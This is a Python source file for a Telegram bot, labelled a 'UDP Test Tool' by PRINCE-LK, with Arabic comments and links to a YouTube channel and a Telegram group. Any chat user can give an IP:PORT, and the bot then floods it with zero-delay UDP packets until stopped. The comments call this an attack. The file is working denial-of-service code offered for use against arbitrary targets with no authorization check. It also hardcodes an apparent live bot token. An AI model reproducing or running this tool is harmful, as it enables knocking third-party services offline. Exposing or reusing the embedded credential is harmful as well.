from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler, ConversationHandler
)
import socket
import threading
import time
from datetime import datetime

# تعريف المتغيرات
CONFIG, START_TEST, STOP_TEST = range(3)
user_data = {}

# التحقق من تاريخ انتهاء الصلاحية
def check_expiration(update: Update, context):
    expiration_date = datetime(2025, 1, 28)
    current_date = datetime.now()

    if current_date > expiration_date:
        update.message.reply_text("🚫 This version has expired! Contact PRINCE-LK for an updated version.")
        return False
    return True

# عرض الاعتمادات
def show_credits(update: Update, context):
    credits_text = (
        "UDP Test Tool\n"
        "Developed by: PRINCE-LK\n"
        "Version: 2.0\n"
        "Expires: January 28, 2025"
    )
    update.message.reply_text(credits_text)

# القائمة الرئيسية
def start(update: Update, context):
    if not check_expiration(update, context):
        return

    keyboard = [
        [InlineKeyboardButton("Start UDP Test", callback_data="start_test")],
        [InlineKeyboardButton("Show Configuration", callback_data="show_config")],
        [InlineKeyboardButton("Show Credits", callback_data="credits")],
        [InlineKeyboardButton("Exit", callback_data="exit")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # الرسالة الترحيبية مع الروابط
    start_message = (
        "🎉 مرحبًا بك في أداة اختبار UDP!\n\n"
        "📺 تابع قناتنا على اليوتيوب: [اضغط هنا](https://youtube.com/@tf3l?si=gvsNSINn8TZ1AvGC)\n"
        "📢 انضم إلى مجموعة التلجرام: [اضغط هنا](https://t.me/+DWOl6UtX4tQ5YmY0)\n\n"
        "اختر خيارًا من القائمة أدناه:"
    )
    update.message.reply_text(start_message, reply_markup=reply_markup, parse_mode="Markdown")

# إعدادات الاختبار
def start_test(update: Update, context):
    query = update.callback_query
    query.answer()
    query.edit_message_text("Please provide the target address in the format IP:PORT:")

    return CONFIG

def set_config(update: Update, context):
    text = update.message.text
    if ":" not in text:
        update.message.reply_text("❌ Invalid format. Please use IP:PORT format.")
        return CONFIG

    ip, port = text.split(":")
    try:
        port = int(port)
    except ValueError:
        update.message.reply_text("❌ Port must be a number.")
        return CONFIG

    user_data[update.effective_chat.id] = {
        "ip": ip,
        "port": port,
        "packet_size": 1024,
        "delay": 0,
        "threads": 1,
    }
    update.message.reply_text(
        f"✅ Configuration set:\nTarget: {ip}:{port}\nPacket Size: 1024 bytes\nDelay: 0 ms\nThreads: 1"
    )
    return START_TEST

def run_test(update: Update, context):
    chat_id = update.effective_chat.id
    if chat_id not in user_data:
        update.message.reply_text("❌ No configuration found. Please configure the test first.")
        return

    config = user_data[chat_id]
    update.message.reply_text("🚀 Starting UDP test... The test will run until you stop it manually.")

    udp_test = UDPTest(config["ip"], config["port"], config["packet_size"], config["delay"], config["threads"])
    udp_test.start_test()

    # حفظ مرجع الهجوم للمستقبل (مثل إيقافه)
    user_data[chat_id]["udp_test"] = udp_test

def stop_test(update: Update, context):
    chat_id = update.effective_chat.id
    if chat_id not in user_data or "udp_test" not in user_data[chat_id]:
        update.message.reply_text("❌ No active test to stop.")
        return

    udp_test = user_data[chat_id]["udp_test"]
    udp_test.stop_flag = True
    update.message.reply_text("🛑 UDP test has been stopped.")

# عرض الإعدادات الحالية
def show_config(update: Update, context):
    query = update.callback_query
    query.answer()
    chat_id = query.message.chat_id

    if chat_id not in user_data:
        query.edit_message_text("❌ No configuration found. Please start a test first.")
        return

    config = user_data[chat_id]
    config_text = (
        f"Target IP: {config['ip']}\n"
        f"Target Port: {config['port']}\n"
        f"Packet Size: {config['packet_size']} bytes\n"
        f"Delay: {config['delay']} ms\n"
        f"Threads: {config['threads']}"
    )
    query.edit_message_text(f"Current Configuration:\n{config_text}")

# إغلاق البوت
def exit_bot(update: Update, context):
    query = update.callback_query
    query.answer()
    query.edit_message_text("👋 Exiting. Goodbye!")

# كلاس UDPTest
class UDPTest:
    def __init__(self, target_ip, target_port, packet_size=1024, delay=0, threads=1):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.delay = delay
        self.thread_count = threads
        self.stop_flag = False
        self.packets_sent = 0
        self.start_time = None

    def send_udp_packets(self):
        message = b'\x00' * self.packet_size
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while not self.stop_flag:
            sock.sendto(message, (self.target_ip, self.target_port))
            self.packets_sent += 1
            if self.delay > 0:
                time.sleep(self.delay / 1000)

        sock.close()

    def start_test(self):
        self.start_time = time.time()
        threads = []

        for _ in range(self.thread_count):
            thread = threading.Thread(target=self.send_udp_packets, daemon=True)
            threads.append(thread)
            thread.start()

        try:
            while not self.stop_flag:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_flag = True

# ربط المعالجات بالبوت
def main():
    TOKEN = "7492612542:AAFhzggVW708rUp2q8VpeP9Gzxvx1yTWJ-I"
    updater = Updater(TOKEN)

    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(start_test, pattern="^start_test$"))
    dp.add_handler(CallbackQueryHandler(show_config, pattern="^show_config$"))
    dp.add_handler(CallbackQueryHandler(show_credits, pattern="^credits$"))
    dp.add_handler(CallbackQueryHandler(exit_bot, pattern="^exit$"))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, set_config))

    # إضافة دالة لإيقاف الهجوم
    dp.add_handler(MessageHandler(Filters.regex("(?i)stop|إيقاف"), stop_test))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
